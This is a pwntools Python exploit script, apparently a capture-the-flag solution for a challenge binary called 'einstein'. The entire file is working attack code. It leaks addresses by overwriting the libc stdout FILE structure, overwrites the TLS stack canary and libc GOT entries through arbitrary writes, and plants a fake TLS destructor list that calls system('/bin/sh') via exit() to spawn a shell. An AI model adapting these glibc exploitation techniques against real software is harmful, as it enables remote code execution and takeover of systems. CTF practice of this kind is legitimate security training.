#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64")
context.log_level = logging.DEBUG
context.terminal = ["tmux", "splitw", "-h", "-F" "#{pane_pid}", "-P"]
exe = "./einstein_patched"
libc = ELF("./libc.so.6")

host = args.HOST or "einstein-d3b1415015e3409c.deploy.phreaks.fr"
port = int(args.PORT or 443)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


gdbscript = """
brva 0x13a2
# b read
# b puts
# b __stack_chk_fail
# b malloc
continue
""".format(
    **locals()
)

canary = 0


def write(addr: int, val: int):
    global canary
    length = 0xFFFFFF
    io.sendlineafter("How long is your story ?", str(length).encode())
    libc_offset = 0x2001FF0
    io.sendlineafter(
        "What's the distortion of time and space ?",
        str(0),
    )
    io.sendafter("use them wisely.", p8(0x41))

    where1 = ld - tls_offset + 5 * 8
    what1 = canary
    canary += 1
    where2 = addr
    what2 = val

    io.recvuntil("is it ???")

    io.sendline(f"{str(where1)} {str(what1)}")
    io.sendline(f"{str(where2)} {str(what2)}")


io = start()

length = 0xFFFFFF
io.sendlineafter("How long is your story ?", str(length).encode())

# We now have our buffer located just before lic
# libc = heap_chunk + 0x1000ff0
# stdout = libc + 0x1ff7a0

libc_offset = 0x1000FF0
stdout_offset = 0x1FF7A0
heap_offset = libc_offset + stdout_offset
io.sendlineafter("What's the distortion of time and space ?", str(heap_offset))

# bin leak at 0x68fd655fde20
# wrptr base 0x68fd655fed00

p = p64(0xFBAD1800) + p64(0) * 3 + p16(0xDE20)
io.sendafter("use them wisely.", p)

ret = io.recvuntil("Everything")

bin = u64(ret[1:8].ljust(8, p8(0))) - (0xBE2C924B020 - 0xBE2C9247000)
info(f"bin: {hex(bin)}")

libc.address = u64(ret[9:0x10].ljust(8, p8(0))) - 0x1FE820
info(f"libc: {hex(libc.address)}")

ld = (
    u64(ret[0x49:0x50].ljust(8, p8(0)))
    - (0x00006AF6ACFC7A88 - 0x6AF6ACFC8000)
    - 0x37000
)
info(f"ld: {hex(ld)}")

# replace canary in TLS to call puts(), with main address in __strlen_avx2 libc got
tls_offset = 0xA8C0
strlen_lib_got_offset = 0x1FE080
# called by __libc_message() which is not called by puts()
strchrnul_libc_got = 0x1FE0C8
main = 0x000011FA

where1 = ld - tls_offset + 5 * 8
what1 = 0x4141414141414141
where2 = libc.address + strchrnul_libc_got
what2 = bin + main
# what2 = libc.address + 0xEB60E
io.sendline(f"{str(where1)} {str(what1)}")
io.sendline(f"{str(where2)} {str(what2)}")

# back to main again

# write fake dtor_list
target = ld - tls_offset - 0x50
system = (libc.sym["system"]) << 17
fake_dtor_list = p64(target + 8)
fake_dtor_list += p64(system)
fake_dtor_list += p64(next(libc.search(b"/bin/sh")))
fake_dtor_list += p64(0) * 7
fake_dtor_list += p64(target + 0x50) + p64(target + 0x50 + 0x9A0) + p64(target + 0x50)
fake_dtor_list += p64(0) * 4

for i in range(0, len(fake_dtor_list), 8):
    write(target + i, u64(fake_dtor_list[i : i + 8]))

# write exit() in strchrnul_libc_got to trigger
write(libc.address + strchrnul_libc_got, libc.sym["exit"])

io.interactive()
